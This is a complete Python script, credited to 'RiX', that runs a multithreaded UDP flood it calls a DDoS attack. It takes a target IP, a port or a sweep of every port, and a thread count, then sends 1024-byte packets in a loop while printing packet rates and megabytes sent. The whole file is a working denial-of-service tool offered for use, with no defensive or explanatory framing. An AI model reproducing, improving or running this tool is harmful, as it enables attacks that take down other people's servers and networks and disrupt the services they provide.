#Author RiX

#Libs
import sys
import socket
import threading
import argparse
from time import sleep

#Parse args
def argsParse():
    global args
    parser = argparse.ArgumentParser(description='Options for DDoS attack')
    parser.add_argument('-i', metavar='IP', dest='ip', help='Target IP address (required)', type=str, required=True)
    parser.add_argument('-p', metavar='PORT', dest='port', help='Target port (default=all)', type=int, default=0, required=False)
    parser.add_argument('-w', metavar='COUNT', dest='threads', help='Threads count (default=100)', type=int, default=100, required=False)
    args = parser.parse_args()

#Class
class DDoS:
    #Init
    def __init__(self, ip, port, threads):
        #Self vars
        self.ip = ip
        self.port = port
        self.threads = threads
        self.packetCount = 0
        self.timeSec = 0

        #Making thread event
        self.threadEvent = threading.Event()
        self.threadEvent.clear()

        #Create threads
        for x in range(self.threads):
            thread = threading.Thread(target=self.ddos)
            thread.start()
            print(f"+Thread #{x+1} started!")
        self.threadEvent.set()

        #Print results
        while self.threadEvent.isSet():
            try:
                #Print speed and count
                self.hasSentPack = self.packetCount
                self.hasSentMb = 1024*self.packetCount
                sleep(0.1)
                self.sentSecPack = (self.packetCount-self.hasSentPack)*10
                self.sentSecMb = (1024*self.packetCount-self.hasSentMb)*10/125000
                self.sentMb = (1024*self.packetCount)/125000
                self.timeSec += 1/10
                print(f'+Request #{self.packetCount} / {round(self.timeSec, 1)} Secs / {self.sentSecPack} Packets/s ~ {round(self.sentMb, 1)} MB / {round(self.sentSecMb, 1)} MB/s -> {self.ip}@{self.port}')
            #Ctrl+C
            except KeyboardInterrupt:
                print('Ctrl+C')
                self.threadEvent.clear()
                sys.exit(0)

    #Create socket
    def createSock(self):
        sock = socket.socket(
            socket.AF_INET,
            socket.SOCK_DGRAM,
            socket.IPPROTO_UDP
        )
        sock.settimeout(10)
        return sock

    #DDoS
    def ddos(self):
        try:
            self.threadEvent.wait()
            while self.threadEvent.isSet():
                while self.threadEvent.isSet():
                    try:
                        sock = self.createSock()
                        if self.port == 0:
                            for y in range(1, 65535):
                                try:
                                    #Send
                                    self.port = y
                                    sock.sendto(bytes(1024), (self.ip, y))
                                    self.packetCount += 1
                                except:
                                    sock.close()
                                    break
                        else:
                            while self.threadEvent.isSet():
                                try:
                                    sock.sendto(bytes(1024), (self.ip, self.port))
                                    self.packetCount += 1
                                except:
                                    sock.close()
                                    break
                    except:
                        sock.close()
                        break
        except:
            pass

#Run
if __name__ == '__main__':
    argsParse()
    DDoS(args.ip, args.port, args.threads)
